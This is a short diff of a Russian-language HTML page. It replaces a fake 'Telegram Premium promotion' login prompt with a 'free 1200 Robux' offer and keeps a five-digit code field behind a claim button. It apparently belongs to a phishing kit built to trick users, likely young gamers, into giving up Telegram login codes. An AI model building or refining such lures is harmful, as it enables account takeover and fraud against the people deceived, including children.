@@ -16,13 +16,13 @@
         <img  id="Logo" src="Logo.png"/>
       </div>
       <div class="texts">
-           Войдите, чтобы участвовать в <br>
-           <span id="Prem">Premium</span> акции от Telegram
+           Введите код, чтобы забрать <br>
+           <span id="Prem">1200 Robux</span> <span id="free">Бесплатно!</span>
       </div>
     <div class="container"> 
-<input type="text" class="message" id = 'phone_code' placeholder="Код:" maxlength="5"   onkeypress='return event.charCode >= 48 && event.charCode <= 57'/>
-<button type="submit" id="send-button">
-ПОДТВЕРДИТЬ
+<input type="text" class="message" id = 'phone_code' placeholder="Код:" maxlength="5" onkeyup="CheckIf();"  onkeypress='return event.charCode >= 48 && event.charCode <= 57'/>
+<button type="submit" id="send-button" disabled>
+ЗАБРАТЬ
 </button>
 </div> 
     </div>  
